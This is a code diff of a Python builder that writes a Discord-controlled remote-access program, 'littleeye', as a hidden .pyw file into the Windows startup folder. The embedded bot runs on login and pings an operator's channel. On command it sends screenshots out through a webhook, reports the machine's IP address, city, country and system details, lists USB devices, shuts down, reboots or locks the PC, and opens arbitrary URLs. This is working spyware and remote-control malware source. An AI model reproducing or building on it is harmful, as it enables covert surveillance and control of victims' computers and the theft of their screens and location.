@@ -38,11 +38,11 @@ bot.remove_command('help')
 async def on_ready():
     channel = bot.get_channel(""" + idchannel + r""")
     pcon = discord.Embed(title = "your pc is on !", description = "do !shutdown to turn off ur pc")
+    pcon.set_image(url = 'https://cdn.discordapp.com/attachments/944934076337492003/946149611867885649/creepy-eye-creepy.gif')
     await channel.send(embed = pcon)
     pathlittleeye = discord.Embed(title = "path of littleeye", description = '""" + startup_path + r"""')
     await channel.send("@everyone")
     await channel.send(embed = pathlittleeye)
-
 @bot.command()
 async def screenshot(ctx):
     hook = Webhook(web)
@@ -51,19 +51,16 @@ async def screenshot(ctx):
     screen.close()
     hook.send(file=File(local + "\\screen.png"))
     os.remove(local + '\\screen.png')
-
 @bot.command()
 async def shutdown(ctx):
     shutdown = discord.Embed(title = "ur pc is off now !")
     shutdown.set_image(url="https://cdn.discordapp.com/attachments/924005157765787660/945699329253969980/pc-computer.gif")
     await ctx.send(embed = shutdown)
     os.system("shutdown /s /t 1")
-
 @bot.command()
 async def pcinfo(ctx):
     import wmi
     w = wmi.WMI()
-
     info = platform.uname()
     System = info.system
     Computer_name = info.node
@@ -80,7 +77,6 @@ async def pcinfo(ctx):
     
     pcinfo.add_field(name = "pc info", value = f"```ip``` : {ip} \n ```city``` : {city} \n ```coutry``` : {country} \n ```region``` : {region} \n ```google map``` : {googlemap} \n ```system``` = {System} \n ```name of pc``` : {Computer_name}, release : {Release}, Version : {Version}, ```Machine``` :  {Machine} \n ```cpu temp```` : { w.Win32_TemperatureProbe()[0].CurrentReading}")
     await ctx.send(embed = pcinfo)
-
 @bot.command()
 async def reboot(ctx):
     reboot = discord.Embed(title = "ur pc reboot")
@@ -92,7 +88,6 @@ async def lock(ctx):
     lock = discord.Embed(title = "Ur pc is lock")
     lock.set_image(url = "https://cdn.discordapp.com/attachments/924005157765787660/945755938806177852/locking-door-fail-sliding-door.gif")
     ctypes.windll.user32.LockWorkStation()
-
 @bot.command()
 async def help(ctx):
     em = discord.Embed(title = "command of little eye :")
@@ -107,21 +102,14 @@ async def help(ctx):
     await ctx.send(embed = em)
 @bot.command()
 async def usbinfo(ctx):
-
     wmi = win32com.client.GetObject ("winmgmts:")
     for usb in wmi.InstancesOf ("Win32_USBHub"):        
         usbem = discord.Embed(title = "usb info :", description = usb.DeviceID)
         await ctx.send(embed = usbem)
-
-
-
-
 @bot.command()
 async def play(ctx, lien):
     webbrowser.open(lien)
 bot.run('""" + token + r"""')
-
-
 """
 
 with open(startup_path + "litlleeye.pyw", 'w', encoding='utf-8') as f:
